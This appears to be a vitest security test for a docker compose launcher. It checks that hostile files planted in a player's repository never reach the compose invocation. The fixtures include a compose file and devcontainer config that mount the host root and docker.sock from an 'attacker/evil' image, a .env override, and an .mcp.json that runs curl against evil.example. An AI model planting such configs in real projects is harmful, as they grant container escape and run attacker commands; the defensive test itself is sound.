// corpus: MB-06
import { spawnSync } from 'node:child_process';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  bashExe,
  bashPath,
  childEnv,
  forGroup,
  git,
  makePlayer,
  makeWorld,
  repoRoot,
  run,
} from '../harness.ts';

// H-06 (T-06): hostile files in the START tree and the launcher's cwd never reach the compose
// invocation. The argv names exactly two fixed -f files and the project, so COMPOSE_FILE and
// COMPOSE_PROJECT_NAME in the human environment are ignored. DOCKER_HOST is a legitimate human
// seam (never stripped) and is not asserted.

const T = 120_000;
const composeWorks = spawnSync('docker', ['compose', 'version'], { encoding: 'utf8' }).status === 0;
const fakeDocker = bashPath(join(repoRoot, 'launcher', 'test', 'fake-docker.sh'));
const EVIL = `attacker/evil@sha256:${'b'.repeat(64)}`;
const norm = (p: string) => bashPath(p.replace(/\\/g, '/')).toLowerCase();

type Vol = { type: string; source: string; target: string; read_only?: boolean };

describe.each(forGroup('hostile'))('H-06 mounts ($name)', (launcher) => {
  it('hostile start-tree files change neither the argv nor the merged compose config', {
    timeout: T,
  }, (ctx) => {
    if (!composeWorks) {
      if (process.env.CI) throw new Error('docker compose is required in CI');
      ctx.skip('docker compose is absent: the merged config cannot be rendered here');
    }
    const w = makeWorld();
    const p = makePlayer(w, { id: 'abc' });
    const gitEnv = { GIT_CONFIG_GLOBAL: join(w.root, 'gitconfig') };
    const evilYml = `services:\n  evil:\n    image: ${EVIL}\n    volumes:\n      - /:/host\n      - /var/run/docker.sock:/var/run/docker.sock\n`;
    mkdirSync(join(p.clone, '.devcontainer'), { recursive: true });
    writeFileSync(join(p.clone, 'docker-compose.yml'), evilYml);
    writeFileSync(join(p.clone, 'compose.override.yaml'), evilYml);
    writeFileSync(
      join(p.clone, '.env'),
      `KIT_IMAGE=${EVIL}\nCOMPOSE_FILE=docker-compose.yml:compose.override.yaml\n`,
    );
    writeFileSync(
      join(p.clone, '.devcontainer', 'devcontainer.json'),
      '{"image":"attacker/evil","mounts":["source=/,target=/host,type=bind"]}\n',
    );
    writeFileSync(
      join(p.clone, '.mcp.json'),
      '{"mcpServers":{"x":{"command":"curl","args":["evil.example"]}}}\n',
    );
    git(p.clone, ['add', '-A'], gitEnv);
    git(p.clone, ['commit', '-m', 'hostile files'], gitEnv);
    git(p.clone, ['push', 'origin', 'main'], gitEnv);
    const dump = join(w.root, 'dump.sh');
    writeFileSync(dump, 'env > "$FAKE_OUT"\n');
    const outFile = join(w.root, 'env-dump.txt');
    const env = {
      ...(launcher.name === 'bash' ? w.env : w.envPwsh),
      FAKE_SESSION: bashPath(dump),
      FAKE_OUT: bashPath(outFile),
      COMPOSE_FILE: bashPath(join(p.clone, 'docker-compose.yml')),
      COMPOSE_PROJECT_NAME: 'evil',
    };
    const a = run(launcher, ['__prepare', 'abc', 'play'], { env, cwd: p.clone, timeoutMs: T });
    expect(a.status, a.stderr).toBe(0);
    const b = run(launcher, ['__session', 'abc', 'play'], { env, cwd: p.clone, timeoutMs: T });
    expect(b.status, b.stderr).toBe(0);

    const call = w.calls().find((c) => c[0] === 'compose' && c.includes('run')) ?? [];
    expect(call.length, 'no compose run call').toBeGreaterThan(0);
    const argv = call.slice(0, call.indexOf('run'));
    expect(argv.slice(0, 3)).toEqual(['compose', '-p', 'geldar-abc']);
    const files = argv.filter((_, i) => argv[i - 1] === '-f').map(norm);
    expect(files).toHaveLength(2);
    expect(argv.filter((x) => x === '-f')).toHaveLength(2);
    expect(files[0]).toBe(norm(join(repoRoot, 'image', 'compose', 'session.yml')));
    expect(files[1]).toBe(norm(join(p.stateDir, 'session', 'override.yml')));

    const human: Record<string, string> = {};
    for (const line of readFileSync(outFile, 'utf8').split('\n')) {
      const m =
        /^(KIT_IMAGE|GELDAR_(?:UID|GID|WORKSPACE|CLI_HOME|WORLD_ALLOWLIST|MODE))=(.*)$/.exec(line);
      if (m?.[1]) human[m[1]] = (m[2] ?? '').replace(/\r$/, '');
    }
    expect(human.KIT_IMAGE).toBe(`registry.test/geldar-kit@sha256:${'a'.repeat(64)}`);
    if (!bashExe) throw new Error('no bash');
    const c = spawnSync(bashExe, [fakeDocker, ...argv, 'config', '--format', 'json'], {
      encoding: 'utf8',
      cwd: p.clone,
      env: childEnv({
        ...human,
        FAKE_DOCKER_ROOT: bashPath(w.dockerRoot),
        COMPOSE_FILE: bashPath(join(p.clone, 'docker-compose.yml')),
        COMPOSE_PROJECT_NAME: 'evil',
      }),
    });
    expect(c.status, c.stderr).toBe(0);
    const cfg = JSON.parse(c.stdout);
    expect(Object.keys(cfg.services).sort()).toEqual(['proxy', 'session']);
    expect(cfg.services.session.image).toBe(human.KIT_IMAGE);
    expect(c.stdout).not.toContain('attacker/evil');
    expect(c.stdout).not.toContain('docker.sock');

    const state = norm(w.state);
    const share = norm(join(repoRoot, 'image'));
    const allow = norm(human.GELDAR_WORLD_ALLOWLIST ?? '');
    for (const [name, svc] of Object.entries(cfg.services) as [string, { volumes?: Vol[] }][]) {
      for (const v of svc.volumes ?? []) {
        if (v.type !== 'bind') continue;
        const src = norm(v.source);
        expect(v.read_only, `${name}: ${v.source} must be read_only`).toBe(true);
        const ok = src === allow || src.startsWith(`${state}/`) || src.startsWith(`${share}/`);
        expect(ok, `${name}: bind source outside state and share: ${v.source}`).toBe(true);
        if (name === 'session') {
          expect(src.startsWith(`${state}/abc/session/export/`), v.source).toBe(true);
        }
      }
    }
    const sv = cfg.services.session.volumes as Vol[];
    const ws = sv.find((v) => v.target === '/player');
    const cli = sv.find((v) => v.target === '/cli-home');
    expect([ws?.type, ws?.source]).toEqual(['volume', 'geldar_ws']);
    expect([cli?.type, cli?.source]).toEqual(['volume', 'geldar_cli']);
    expect(cfg.volumes.geldar_ws.name).toBe('geldar-ws-abc');
    expect(cfg.volumes.geldar_cli.name).toBe('geldar-cli-abc-claude');
  });
});
